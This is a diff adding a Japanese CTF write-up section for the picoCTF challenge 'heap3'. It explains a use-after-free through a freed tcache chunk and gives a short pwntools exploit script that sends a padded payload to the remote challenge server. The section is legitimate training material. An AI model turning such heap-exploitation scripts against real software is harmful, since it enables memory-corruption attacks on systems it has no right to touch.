@@ -84,3 +84,52 @@ target.sendlineafter(b'Data for buffer:',payload)
 target.sendlineafter(b'Enter your choice: ',b'4')
 target.interactive()
 ```
+
+### heap3
+
+問題画面
+```
+freed but still in use
+now memory untracked
+do you smell the bug?
+
+1. Print Heap
+2. Allocate object
+3. Print x->flag
+4. Check for win
+5. Free x
+6. Exit
+
+Enter your choice:
+```
+
+・5番でxをフリーした後に1番を選択してheapを見ると、まだheapにxが存在している  
+→use after freeの脆弱性がある  
+
+・pwndbgでフリーした後にheapコマンドを実行すると0x30のtcachebinsにxがフリーされている  
+
+・0x30でAllocateしてオーバーフローするとxの値を汚染できる  
+
+ソースコード  
+
+```
+from pwn import *
+
+#target = process('./chall')
+target = remote('tethys.picoctf.net',54474)
+
+payload = b'A'*30 + b'pico'
+
+#free x
+target.sendlineafter(b'Enter your choice:',b'5')
+
+#allocate object 0x30 and over flow
+target.sendlineafter(b'Enter your choice:',b'2')
+target.sendlineafter(b'Size of object allocation:',b'30')
+target.sendlineafter(b'Data for flag:',payload)
+
+#check for win
+target.sendlineafter(b'Enter your choice:',b'4')
+
+target.interactive()
+```
